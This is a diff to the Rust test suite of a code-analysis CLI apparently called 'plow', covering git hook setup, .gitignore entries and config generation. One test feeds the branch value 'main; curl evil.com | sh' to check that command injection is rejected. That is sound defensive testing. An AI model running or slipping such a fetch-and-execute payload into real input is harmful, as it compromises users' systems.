         assert!(content.contains("command -v plow"));
         assert!(content.contains("gate=new-only"));
-        // Indentation preserved: the `if` body is indented under the conditional.
         assert!(content.contains("\n  BASE=\""));
     }
 
@@ -952,7 +1510,6 @@ mod tests {
         let husky_hook = root.join(".husky/pre-commit");
         assert!(husky_hook.exists());
         assert!(!root.join(".git/hooks/pre-commit").exists());
-        // Same template flows through husky path: upstream + merge-base block + marker.
         let content = std::fs::read_to_string(&husky_hook).unwrap();
         assert!(content.contains(GIT_HOOK_MARKER));
         assert!(content.contains("@{upstream}"));
@@ -1064,7 +1621,6 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         let root = dir.path();
         std::fs::write(root.join("lefthook.yml"), "").unwrap();
-        // lefthook mode prints instructions and succeeds without writing a file
         let exit = run_init(&hooks_opts(root, None));
         assert_eq!(exit, ExitCode::SUCCESS);
     }
@@ -1092,11 +1648,8 @@ mod tests {
         std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
         let exit = run_init(&hooks_opts(root, Some("main; curl evil.com | sh")));
         assert_eq!(exit, ExitCode::from(2));
-        // Hook file should NOT have been written
         assert!(!root.join(".git/hooks/pre-commit").exists());
     }
-
-    // ── Gitignore tests ────────────────────────────────────────────
 
     #[test]
     fn init_creates_gitignore_with_plow_entry() {
@@ -1135,7 +1688,6 @@ mod tests {
         std::fs::write(root.join(".gitignore"), ".plow\n").unwrap();
         run_init(&config_opts(root, false));
         let content = std::fs::read_to_string(root.join(".gitignore")).unwrap();
-        // Should not add a duplicate — .plow already covers the directory
         assert_eq!(content.matches(".plow").count(), 1);
     }
 
@@ -1157,8 +1709,6 @@ mod tests {
         let content = std::fs::read_to_string(root.join(".gitignore")).unwrap();
         assert!(content.contains(".plow/"));
     }
-
-    // ── Project detection tests ────────────────────────────────────
 
     #[test]
     fn detect_empty_project() {
@@ -1300,8 +1850,6 @@ mod tests {
         assert_eq!(info.test_framework.as_deref(), Some("Playwright"));
     }
 
-    // ── Config generation tests ────────────────────────────────────
-
     #[test]
     fn json_config_empty_project_is_valid() {
         let info = ProjectInfo {
@@ -1312,6 +1860,8 @@ mod tests {
             test_framework: None,
             ui_framework: None,
             has_storybook: false,
+            package_manager: None,
+            test_framework_ambiguous: false,
         };
         let json = build_json_config(&info);
         let parsed = parse_jsonc_config(&json);
@@ -1319,7 +1869,6 @@ mod tests {
         assert!(parsed["entry"].is_array());
         assert!(parsed["duplicates"].is_object());
         assert!(parsed["rules"].is_object());
-        // JS extensions for non-TS project
         assert!(json.contains("{js,jsx,mjs}"));
     }
 
@@ -1333,6 +1882,8 @@ mod tests {
             test_framework: None,
             ui_framework: None,
             has_storybook: false,
+            package_manager: None,
+            test_framework_ambiguous: false,
         };
         let json = build_json_config(&info);
         assert!(json.contains("{ts,tsx,js,jsx}"));
@@ -1348,6 +1899,8 @@ mod tests {
             test_framework: None,
             ui_framework: None,
             has_storybook: false,
+            package_manager: None,
+            test_framework_ambiguous: false,
         };
         let json = build_json_config(&info);
         let parsed = parse_jsonc_config(&json);
@@ -1366,6 +1919,8 @@ mod tests {
             test_framework: None,
             ui_framework: None,
             has_storybook: true,
+            package_manager: None,
+            test_framework_ambiguous: false,
         };
         let json = build_json_config(&info);
         let parsed = parse_jsonc_config(&json);
@@ -1383,6 +1938,8 @@ mod tests {
             test_framework: Some("Vitest".to_string()),
             ui_framework: None,
             has_storybook: false,
+            package_manager: None,
+            test_framework_ambiguous: false,
         };
         let json = build_json_config(&info);
         let parsed = parse_jsonc_config(&json);
@@ -1399,6 +1956,8 @@ mod tests {
             test_framework: None,
             ui_framework: None,
             has_storybook: false,
+            package_manager: None,
+            test_framework_ambiguous: false,
         };
         let toml = build_toml_config(&info);
         assert!(toml.contains("[workspaces]"));
@@ -1415,6 +1974,8 @@ mod tests {
             test_framework: None,
             ui_framework: None,
             has_storybook: true,
+            package_manager: None,
+            test_framework_ambiguous: false,
         };
         let toml = build_toml_config(&info);
         assert!(toml.contains("ignorePatterns = [\".storybook/**\"]"));
@@ -1495,11 +2056,6 @@ mod config_schema_drift {
     #[test]
     fn schema_json_in_sync_with_derived() {
         let derived = PlowConfig::json_schema();
-        // `PlowConfig::json_schema()` wraps `serde_json::to_value(...)` with
-        // an `unwrap_or_default()`. If schemars ever produces a value that
-        // serde_json refuses to convert, the live CLI silently emits `null`
-        // and an unguarded `assert_eq!` between two `null`s would pass. Guard
-        // against that whole class of silent regression before comparing.
         assert!(
             derived.is_object(),
             "PlowConfig::json_schema() did not produce a JSON object (got `{derived}`); \
